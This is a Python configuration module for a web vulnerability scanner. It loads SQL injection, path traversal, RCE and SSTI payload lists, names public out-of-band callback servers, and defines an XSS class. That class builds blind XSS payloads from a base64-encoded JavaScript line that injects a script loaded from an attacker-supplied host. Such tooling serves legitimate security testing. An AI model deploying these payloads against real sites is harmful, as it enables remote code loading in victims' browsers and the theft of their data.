import os.path
from base64 import b64encode
from pathlib import Path
from typing import Union

from rich.console import Console

base_dir = Path(__file__).resolve().parent.parent

# interact.sh public servers
INTERACT_SERVERS = [
    "interact.sh",
    "oast.pro",
    "oast.live",
    "oast.site",
    "oast.online",
    "oast.me",
]

LOGGING_FORMAT = "%(name)-12s: %(levelname)-8s %(message)s"
LOGGING_FILE = os.path.join(Path.home(), ".scant3r.log")
CLEAR_LOGGING_FILE = True



# ENABLED Modules ( after using `-m all` option)
ENABLED_MODS = ["ssti","firebase","req_callback"]

# CLI
LOGO = open(f"{base_dir}/conf/logo/main.txt", "r").read()
console = Console()
FIREBASE_URL = 'https://%s.firebaseio.com'

# PAYLOADS
SQLI_PAYLOADS = Path(f"{base_dir}/db/txt/sqli.txt").read_text().splitlines()
SQL_ERRORS = Path(f"{base_dir}/db/txt/sqli_errors.txt").read_text().splitlines()

PATH_TRAVERSAL = Path(f"{base_dir}/db/txt/traversal.txt").read_text().splitlines()
TLD = Path(f"{base_dir}/db/txt/tld.txt").read_text().splitlines()

RCE_PAYLOADS_PWD = Path(f"{base_dir}/db/txt/pwd.txt").read_text().splitlines()
RCE_PAYLOADS_PASSWD = Path(f"{base_dir}/db/txt/passwd.txt").read_text().splitlines()

SSTI = Path(f"{base_dir}/db/txt/ssti.txt").read_text().splitlines()
SSRF_PARAMS = Path(f"{base_dir}/db/txt/ssrf_parameters.txt").read_text().splitlines()


class XSS:
    def __init__(self, host: Union[str, None] = None):
        self.payloads = (
            Path(f"{base_dir}/wordlists/txt/xss.txt").read_text().splitlines()
        )
        self.blind_payloads = open(f"{base_dir}/wordlists/txt/bxss.txt", "r")
        self.blind = []
        if host:
            b = (
                b64encode(
                    f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode(
                        "utf-8"
                    )
                )
                .decode("utf-8")
                .replace("=", "")
            )
            for blind_payload in self.blind_payloads:
                new_payload = blind_payload.replace("{host}", host).replace(
                    "{b64_host}", b
                )
                self.payloads.append(new_payload)
